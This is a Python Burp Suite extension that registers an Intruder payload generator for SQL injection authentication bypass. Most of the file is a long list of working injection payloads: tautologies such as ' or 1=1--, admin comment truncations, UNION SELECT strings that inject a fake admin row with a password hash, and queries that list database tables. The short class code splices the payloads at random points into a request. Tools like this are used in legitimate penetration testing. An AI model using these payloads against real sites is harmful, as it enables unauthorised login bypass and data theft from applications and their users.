from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList

import random

try_num = 30
payload_list = [
  "'-'",
  "' '",
  "'&'",
  "'^'",
  "'*'",
  "' or ''-'",
  "' or '' '",
  "' or ''&'",
  "' or ''^'",
  "' or ''*'",
  '"-"',
  '" "',
  '"&"',
  '"^"',
  '"*"',
  '" or ""-"',
  '" or "" "',
  '" or ""&"',
  '" or ""^"',
  '" or ""*"',
  "or true--",
  '" or true--',
  "' or true--",
  '") or true--',
  "') or true--",
  "' or 'x'='x",
  "') or ('x')=('x",
  "')) or (('x'))=(('x",
  '" or "x"="x',
  '") or ("x")=("x',
  '")) or (("x"))=(("x',
  "or 1=1",
  "or 1=1--",
  "or 1=1#",
  "or 1=1/*",
  "admin' --",
  "admin' #",
  "admin'/*",
  "admin' or '1'='1",
  "admin' or '1'='1'--",
  "admin' or '1'='1'#",
  "admin' or '1'='1'/*",
  "admin'or 1=1 or ''='",
  "admin' or 1=1",
  "admin' or 1=1--",
  "admin' or 1=1#",
  "admin' or 1=1/*",
  "admin') or ('1'='1",
  "admin') or ('1'='1'--",
  "admin') or ('1'='1'#",
  "admin') or ('1'='1'/*",
  "admin') or '1'='1",
  "admin') or '1'='1'--",
  "admin') or '1'='1'#",
  "admin') or '1'='1'/*",
  "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
  'admin" --',
  'admin" #',
  'admin"/*',
  'admin" or "1"="1',
  'admin" or "1"="1"--',
  'admin" or "1"="1"#',
  'admin" or "1"="1"/*',
  'admin"or 1=1 or ""="',
  'admin" or 1=1',
  'admin" or 1=1--',
  'admin" or 1=1#',
  'admin" or 1=1/*',
  'admin") or ("1"="1',
  'admin") or ("1"="1"--',
  'admin") or ("1"="1"#',
  'admin") or ("1"="1"/*',
  'admin") or "1"="1',
  'admin") or "1"="1"--',
  'admin") or "1"="1"#',
  'admin") or "1"="1"/*',
  '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055',
  "==",
  "=",
  "'",
  "' --",
  "' #",
  "' –",
  "'--",
  "'/*",
  "'#",
  '" --',
  '" #',
  '"/*',
  "' and 1='1",
  "' and a='a",
  " or 1=1",
  " or true",
  "' or ''='",
  '" or ""="',
  "1′) and '1′='1–",
  "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",
  '" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055',
  " and 1=1",
  " and 1=1–",
  "' and 'one'='one",
  "' and 'one'='one–",
  "' group by password having 1=1--",
  "' group by userid having 1=1--",
  "' group by username having 1=1--",
  " like '%'",
  " or 0=0 --",
  " or 0=0 #",
  " or 0=0 –",
  "' or         0=0 #",
  "' or 0=0 --",
  "' or 0=0 #",
  "' or 0=0 –",
  '" or 0=0 --',
  '" or 0=0 #',
  '" or 0=0 –',
  "%' or '0'='0",
  " or 1=1",
  " or 1=1--",
  " or 1=1/*",
  " or 1=1#",
  " or 1=1–",
  "' or 1=1--",
  "' or '1'='1",
  "' or '1'='1'--",
  "' or '1'='1'/*",
  "' or '1'='1'#",
  "' or '1′='1",
  "' or 1=1",
  "' or 1=1 --",
  "' or 1=1 –",
  "' or 1=1--",
  "' or 1=1;#",
  "' or 1=1/*",
  "' or 1=1#",
  "' or 1=1–",
  "') or '1'='1",
  "') or '1'='1--",
  "') or '1'='1'--",
  "') or '1'='1'/*",
  "') or '1'='1'#",
  "') or ('1'='1",
  "') or ('1'='1--",
  "') or ('1'='1'--",
  "') or ('1'='1'/*",
  "') or ('1'='1'#",
  "'or'1=1",
  "'or'1=1′",
  '" or "1"="1',
  '" or "1"="1"--',
  '" or "1"="1"/*',
  '" or "1"="1"#',
  '" or 1=1',
  '" or 1=1 --',
  '" or 1=1 –',
  '" or 1=1--',
  '" or 1=1/*',
  '" or 1=1#',
  '" or 1=1–',
  '") or "1"="1',
  '") or "1"="1"--',
  '") or "1"="1"/*',
  '") or "1"="1"#',
  '") or ("1"="1',
  '") or ("1"="1"--',
  '") or ("1"="1"/*',
  '") or ("1"="1"#',
  ") or '1′='1–",
  ") or ('1′='1–",
  "' or 1=1 LIMIT 1;#",
  "'or 1=1 or ''='",
  '"or 1=1 or ""="',
  "' or 'a'='a",
  "' or a=a--",
  "' or a=a–",
  "') or ('a'='a",
  '" or "a"="a',
  '") or ("a"="a',
  "' or 'one'='one",
  "' or 'one'='one–",
  "' or uid like '%",
  "' or uname like '%",
  "' or userid like '%",
  "' or user like '%",
  "' or username like '%",
  "' or 'x'='x",
  "') or ('x'='x",
  '" or "x"="x',
  "' OR 'x'='x'#;",
  "'=' 'or' and '=' 'or'",
  "' UNION ALL SELECT 1, @@version;#",
  "' UNION ALL SELECT system_user(),user();#",
  "' UNION select table_schema,table_name FROM information_Schema.tables;#",
  "admin' and substring(password/text(),1,1)='7",
  "' and substring(password/text(),1,1)='7",
  "' or 1=1 limit 1 -- -+",
]

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
    
    def getGeneratorName(self):
        return "SQL Auth_Bypass Payload Generator"

    def createNewInstance(self, attack):
        return BurpFuzzer(self, attack)


class BurpFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = try_num
        self.num_iterations = 0
        self.num_tried = list()

        return
    
    def hasMorePayloads(self):
        if (self.num_iterations == self.max_payloads) or (len(self.num_tried) == len(payload_list)):
            return False
        else:
            return True
    
    def getNextPayload(self, current_payload):
        payload = ''.join(chr(x) for x in current_payload)

        payload = self.mutate_payload(payload)

        self.num_iterations += 1

        return payload
    
    def reset(self):
        self.num_iterations = 0
        return
    
    def mutate_payload(self, original_payload):
        offset = random.randint(0, len(original_payload) - 1)
        front, back = original_payload[:offset], original_payload[offset:]
        
        
        while True:
            sample_number = random.randint(0, len(payload_list) -1)
            if sample_number not in self.num_tried:
                    self.num_tried.append(sample_number)
                    break
        front += payload_list[sample_number]

        return front + back